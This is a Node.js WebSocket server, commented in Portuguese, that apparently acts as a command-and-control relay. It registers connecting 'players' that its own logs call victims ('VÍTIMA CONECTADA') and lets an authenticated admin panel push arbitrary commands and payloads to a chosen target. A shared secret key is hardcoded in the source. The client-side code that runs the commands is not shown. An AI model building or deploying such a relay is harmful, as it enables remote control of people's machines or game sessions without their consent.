const WebSocket = require('ws');

const PORT = process.env.PORT || 8080;
const wss = new WebSocket.Server({ port: PORT });

const CHAVE_SECRETA = "BatataFritaComQueijo123";

let clientesConectados = new Map(); // socket -> nome do jogador
let painelAdmin = null;

console.log(`[SERVIDOR] WebSocket rodando na porta ${PORT}...`);

function broadcastLista() {
    if (painelAdmin && painelAdmin.readyState === WebSocket.OPEN) {
        let listaNomes = Array.from(clientesConectados.keys());
        painelAdmin.send(JSON.stringify({
            tipo: "atualizar_lista",
            clientes: listaNomes
        }));
    }
}

wss.on('connection', (ws) => {
    ws.on('message', (message) => {
        let data;
        try {
            data = JSON.parse(message);
        } catch (e) {
            return;
        }

        if (data.tipo === 'auth') {
            if (data.chave !== CHAVE_SECRETA) {
                ws.close();
                return;
            }
            clientesConectados.set(data.jogador, ws);
            ws.nomeJogador = data.jogador;
            console.log(`[VÍTIMA CONECTADA]: ${data.jogador}`);
            broadcastLista();
        }

        if (data.tipo === 'auth_admin') {
            if (data.chave !== CHAVE_SECRETA) {
                ws.close();
                return;
            }
            painelAdmin = ws;
            console.log('[PAINEL ADMIN CONECTADO]');
            broadcastLista();
        }

        if (data.tipo === 'comando' && ws === painelAdmin) {
            let alvoSocket = clientesConectados.get(data.alvo);
            if (alvoSocket && alvoSocket.readyState === WebSocket.OPEN) {
                alvoSocket.send(JSON.stringify({
                    comando: data.comando,
                    payload: data.payload,
                    remetente: data.remetente
                }));
                console.log(`[COMANDO] Alvo: ${data.alvo} | Ação: ${data.comando}`);
            }
        }
    });

    ws.on('close', () => {
        if (ws === painelAdmin) {
            painelAdmin = null;
        } else if (ws.nomeJogador) {
            clientesConectados.delete(ws.nomeJogador);
            console.log(`[VÍTIMA DESCONECTADA]: ${ws.nomeJogador}`);
            broadcastLista();
        }
    });

    ws.on('error', () => {});
});
